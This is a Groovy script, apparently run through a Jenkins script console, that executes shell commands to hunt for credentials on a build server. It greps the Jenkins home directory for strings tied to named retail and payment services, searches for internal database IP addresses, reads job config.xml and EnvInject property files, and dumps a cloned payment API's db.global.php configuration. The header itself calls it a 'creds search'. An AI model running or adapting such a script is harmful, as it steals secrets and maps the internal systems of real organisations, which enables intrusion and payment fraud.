// MICRO-AL: Envinject + T1 creds search (no DB connect)
def run = { cmd ->
    def p = ["bash", "-c", cmd].execute()
    def out = new StringBuffer()
    def err = new StringBuffer()
    p.consumeProcessOutput(out, err)
    p.waitForOrKill(25000)
    out.toString().take(5000)
}

println "=== ENVINJECT: look for T1/Sears env vars ==="
def envinj = run("find /var/jenkins_home/jobs -name '*.properties' 2>/dev/null | head -20")
println "Properties files: " + envinj.take(500)

def bigGrep = run("grep -r 't1comercios\\|T1PAGOS\\|apifincadob\\|dbasears\\|mrc-services\\|APIFINCA' /var/jenkins_home/ 2>/dev/null | grep -v Binary | grep -v '/.git/' | head -20")
println "\nT1 grep all jenkins_home: " + bigGrep.take(2000)

println "\n=== ALSO GREP FOR DB IPS ==="
def ipgrep = run("grep -r '172\\.27\\.141\\.' /var/jenkins_home/ 2>/dev/null | grep -v Binary | grep -v '.pack\\|.idx' | head -20")
println "172.27.141 grep: " + ipgrep.take(2000)

println "\n=== SEARCH FOR db.global.php or creds file in caja-pagos-api ==="
def dbglobal = run("cat '/tmp/gc_claroshop_caja-pagos-api/config/db.global.php' 2>/dev/null | head -60")
println "caja-pagos-api db.global.php: " + dbglobal.take(2000)

def cajaGlobal = run("ls /tmp/gc_claroshop_caja-pagos-api/config/ 2>/dev/null && cat '/tmp/gc_claroshop_caja-pagos-api/config/db.global.php' 2>/dev/null")
println "caja-pagos-api config/: " + cajaGlobal.take(1000)

println "\n=== ENVINJECT configs for t1/sears/caja jobs ==="
def t1jobs = run("ls /var/jenkins_home/jobs/ | grep -i 't1\\|sears\\|caja\\|tienda\\|monedero\\|axii' | head -20")
println "Relevant jobs: " + t1jobs.take(500)

if (t1jobs.trim()) {
    def firstJob = t1jobs.trim().split('\n')[0].trim()
    println "\n=== Reading config of job: ${firstJob} ==="
    def jobConfig = run("cat '/var/jenkins_home/jobs/${firstJob}/config.xml' 2>/dev/null | head -80")
    println jobConfig.take(2000)
}

println "=== DONE MICRO-AL ==="
